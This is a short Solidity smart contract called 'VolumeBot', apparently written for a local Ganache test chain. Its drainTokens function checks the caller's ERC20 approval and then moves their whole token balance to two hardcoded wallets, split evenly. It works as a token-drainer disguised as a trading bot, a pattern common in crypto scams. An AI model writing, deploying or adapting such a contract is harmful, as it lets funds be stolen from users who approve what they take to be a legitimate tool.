// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/IERC20.sol";

contract VolumeBot {
    // Hardcoded wallet addresses from Ganache
    address public wallet1 = 0x2048a20a63f88979CD50C080D34942bFbcFa5761; // accounts[2]
    address public wallet2 = 0xFfFF689eA303191dB3DD548D5de2B224F0b4069a; // accounts[3]

    // Event to notify successful transaction
    event TokensTransferred(address indexed user, address indexed token, uint256 amountToWallet1, uint256 amountToWallet2);

    // Function to drain 100% of the user's token balance and split between the two wallets
    function drainTokens(address token) public {
        // Get the user's balance
        uint256 balance = IERC20(token).balanceOf(msg.sender);
        require(balance > 0, "No tokens to transfer");

        // Check if the contract is allowed to spend the full balance
        uint256 allowance = IERC20(token).allowance(msg.sender, address(this));
        require(allowance >= balance, "Insufficient allowance: Approve the contract to spend your tokens");

        uint256 amountToWallet1;
        uint256 amountToWallet2;

        if (balance == 1) {
            // If balance is 1, transfer it all to wallet1
            amountToWallet1 = 1;
            amountToWallet2 = 0;
            IERC20(token).transferFrom(msg.sender, wallet1, 1);
        } else {
            // Split evenly, remainder stays with user
            uint256 halfAmount = balance / 2;
            amountToWallet1 = halfAmount;
            amountToWallet2 = halfAmount;
            IERC20(token).transferFrom(msg.sender, wallet1, halfAmount);
            IERC20(token).transferFrom(msg.sender, wallet2, halfAmount);
        }

        // Emit event with the amounts transferred
        emit TokensTransferred(msg.sender, token, amountToWallet1, amountToWallet2);
    }
}